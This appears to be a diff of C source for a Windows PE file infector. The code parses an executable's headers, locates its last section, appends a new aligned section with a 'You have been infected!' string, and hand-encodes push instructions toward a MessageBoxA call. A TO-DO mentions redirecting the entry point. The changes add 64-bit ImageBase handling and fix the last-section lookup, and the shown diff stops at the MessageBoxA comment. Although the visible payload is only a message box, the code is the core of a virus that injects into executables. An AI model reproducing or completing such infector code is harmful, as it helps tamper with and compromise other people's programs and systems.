@@ -42,8 +42,12 @@ int main(int argc, char *argv[]) {
 	// TO-DO: Change entry point
 	imageOptionalHeader.AddressOfEntryPoint =
 		getval(fr, dd, SEEK_SET, ioh_addr+16);
-	imageOptionalHeader.ImageBase =
-		getval(fr,dd, SEEK_SET, ioh_addr+28);
+	if (imageOptionalHeader.Magic == 0x10B)
+		imageOptionalHeader.ImageBase =
+		   getval(fr,dd, SEEK_SET, ioh_addr+28);
+	else
+		imageOptionalHeader.ImageBase =
+		   getval(fr,8, SEEK_SET, ioh_addr+24);
 	imageOptionalHeader.SectionAlignment =
 		getval(fr, dd, SEEK_SET, ioh_addr+32);
 	imageOptionalHeader.FileAlignment =
@@ -55,17 +59,21 @@ int main(int argc, char *argv[]) {
 	// DWORD lastish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader
 		// + 40 * (imageFileHeader.NumberOfSections-1);
 
-	// Find address of last section header
+	// Find PointerToRawData of the last section
 	// Necessary? Not if section header is organised by the order of the sections' appearance in the programme
+	// DWORD lastish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader
+		// + 40 * (imageFileHeader.NumberOfSections-1);
+	IMAGE_SECTION_HEADER lastish;
+	lastish.PointerToRawData = 0;
 	DWORD lastish_addr = 0;
 	for (int i = 0; i < imageFileHeader.NumberOfSections; i++) {
 		DWORD tempval = getval(fr,dd, SEEK_SET,
-			ioh_addr + imageFileHeader.SizeOfOptionalHeader + 40*i + 12);
-		if (tempval < lastish_addr)
-			lastish_addr = tempval;
+			ioh_addr + imageFileHeader.SizeOfOptionalHeader + 40*i + 20);
+		if (tempval < lastish.PointerToRawData) {
+			lastish.PointerToRawData = tempval;
+			lastish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader + 40 * i;
+		}
 	}
-
-	IMAGE_SECTION_HEADER lastish;
 
 	lastish.VirtualAddress =
 		getval(fr, dd, SEEK_SET, lastish_addr + 12);
@@ -100,18 +108,18 @@ int main(int argc, char *argv[]) {
 	// Adding new section
 	fseek(fr, 0, SEEK_END);
 	const long old_end = ftell(fr);
-	const long newsh_addr = closest(old_end+1,imageOptionalHeader.SectionAlignment);
+	newish.PointerToRawData = closest(old_end+1,imageOptionalHeader.SectionAlignment);
 	const char *msgCaption = "Notice";
 	const char *msgText = "You have been infected!";
 
-	pad(fa, newsh_addr - old_end);
+	pad(fa, newish.PointerToRawData - old_end);
 	// Should be written at newsh_addr
 	fwrite(msgCaption, strlen(msgCaption)+1, 1, fa);
 	// Should be written at newsh_addr + strlen(msgCaption) + 1
 	fwrite(msgText, strlen(msgText)+1, 1, fa);
 	instruct(fa, 0x68, 0x1030);
-	instruct(fa, 0x68, imageOptionalHeader.ImageBase+newsh_addr);
-	instruct(fa, 0x68, imageOptionalHeader.ImageBase + newsh_addr + strlen(msgCaption) + 1);
+	instruct(fa, 0x68, imageOptionalHeader.ImageBase+newish.PointerToRawData);
+	instruct(fa, 0x68, imageOptionalHeader.ImageBase + newish.PointerToRawData + strlen(msgCaption) + 1);
 	instruct(fa, 0x6a, 0);
 
 	// Call MessageBoxA
